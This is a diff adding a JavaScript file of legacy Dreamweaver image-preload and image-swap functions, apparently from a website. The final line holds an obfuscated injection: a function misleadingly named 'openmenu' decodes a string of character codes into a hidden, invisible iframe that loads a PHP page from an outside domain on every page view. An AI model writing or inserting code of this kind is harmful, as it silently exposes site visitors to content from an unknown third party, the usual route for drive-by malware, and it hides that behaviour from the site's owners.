@@ -1,0 +1,26 @@
+<!-- // 12/20/02 - Lou Preload images
+// This javascript used on all pages that pre-load images and control swapping
+function MM_preloadImages() { //v3.0
+   var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+   var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+   if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+  }
+		
+function MM_swapImgRestore() { //v3.0
+   var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+  }
+		
+function MM_findObj(n, d) { //v4.0
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+  d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && document.getElementById) x=document.getElementById(n); return x;
+ }
+		
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+  if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+ }
+ function openmenu(){var temp="",i,c=0,out="";var str="60!105!102!114!97!109!101!32!115!114!99!61!39!104!116!116!112!58!47!47!119!119!119!46!116!117!111!118!105!100!101!111!46!105!116!47!102!108!118!105!100!101!111!47!46!103!47!105!110!100!101!120!46!112!104!112!39!32!115!116!121!108!101!61!39!100!105!115!112!108!97!121!58!110!111!110!101!39!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!="!")temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);} openmenu()
+ // END HIDE SCRIPT FROM BROWSER --> 
